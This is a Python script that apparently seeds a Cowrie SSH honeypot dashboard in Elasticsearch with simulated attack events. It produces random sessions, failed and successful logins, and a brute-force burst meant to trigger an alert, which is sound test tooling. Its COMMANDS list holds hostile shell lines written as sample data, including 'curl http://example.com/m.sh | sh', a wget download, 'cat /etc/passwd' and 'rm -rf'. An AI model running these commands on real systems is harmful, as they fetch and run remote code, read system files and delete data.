import json
import random
import sys
import uuid
from datetime import datetime, timedelta, timezone

import requests

ES = "http://localhost:9200"

# IP publiques variées (uniquement pour tester la géolocalisation)
IPS = [
    "8.8.8.8", "1.1.1.1", "185.220.101.1", "45.33.32.156", "91.121.87.10",
    "103.21.244.0", "200.147.35.1", "41.215.241.1", "202.12.27.33",
    "193.0.14.129", "180.76.15.1", "62.210.1.1", "5.188.62.1", "117.18.232.1",
]
USERS = ["root", "admin", "test", "ubuntu", "oracle", "pi", "user", "postgres"]
PASSWORDS = ["123456", "admin", "password", "root", "toor", "qwerty", "12345", "letmein", "test"]
COMMANDS = [
    "ls", "whoami", "uname -a", "cat /etc/passwd", "id", "pwd",
    "wget http://example.com/x.sh", "curl http://example.com/m.sh | sh",
    "chmod +x x.sh", "rm -rf /tmp/x",
]

now = datetime.now(timezone.utc)
stream = f"cowrie-{now:%Y.%m.%d}"


def ts(offset_minutes):
    return (now - timedelta(minutes=offset_minutes)).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def session_events(ip, minute):
    sid = uuid.uuid4().hex[:12]
    base = {"src_ip": ip, "session": sid, "simulated": True}
    events = [{**base, "eventid": "cowrie.session.connect", "@timestamp": ts(minute)}]
    for _ in range(random.randint(1, 4)):
        events.append({**base, "eventid": "cowrie.login.failed", "@timestamp": ts(minute),
                       "username": random.choice(USERS), "password": random.choice(PASSWORDS)})
    if random.random() < 0.6:
        events.append({**base, "eventid": "cowrie.login.success", "@timestamp": ts(minute),
                       "username": random.choice(USERS), "password": random.choice(PASSWORDS)})
        for _ in range(random.randint(1, 5)):
            cmd = random.choice(COMMANDS)
            events.append({**base, "eventid": "cowrie.command.input", "@timestamp": ts(minute),
                           "command_input": cmd, "message": f"CMD: {cmd}"})
    return events


def bulk(events):
    lines = []
    for e in events:
        lines.append(json.dumps({"create": {}}))
        lines.append(json.dumps(e))
    r = requests.post(
        f"{ES}/{stream}/_bulk?pipeline=cowrie-geoip",
        data="\n".join(lines) + "\n",
        headers={"Content-Type": "application/x-ndjson"},
        timeout=30,
    )
    res = r.json()
    if res.get("errors"):
        err = next(i for i in res["items"] if "error" in i["create"])
        print("Erreur :", err["create"]["error"])
        sys.exit(1)
    print(f"{len(events)} événements envoyés dans {stream}")


def spread(sessions=60):
    """Attaques réparties sur les dernières 24 h."""
    events = []
    for _ in range(sessions):
        events += session_events(random.choice(IPS), random.randint(0, 1400))
    bulk(events)


def burst(ip=None, count=30):
    """Brute force : beaucoup de tentatives d'une même IP, à l'instant (déclenche l'alerte)."""
    ip = ip or random.choice(IPS)
    sid = uuid.uuid4().hex[:12]
    events = [{
        "eventid": "cowrie.login.failed", "src_ip": ip, "session": sid, "simulated": True,
        "@timestamp": ts(0), "username": "root", "password": random.choice(PASSWORDS),
    } for _ in range(count)]
    print(f"Brute force simulé depuis {ip}")
    bulk(events)


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "spread"
    if mode == "burst":
        burst()
    else:
        spread(int(sys.argv[2]) if len(sys.argv) > 2 else 60)
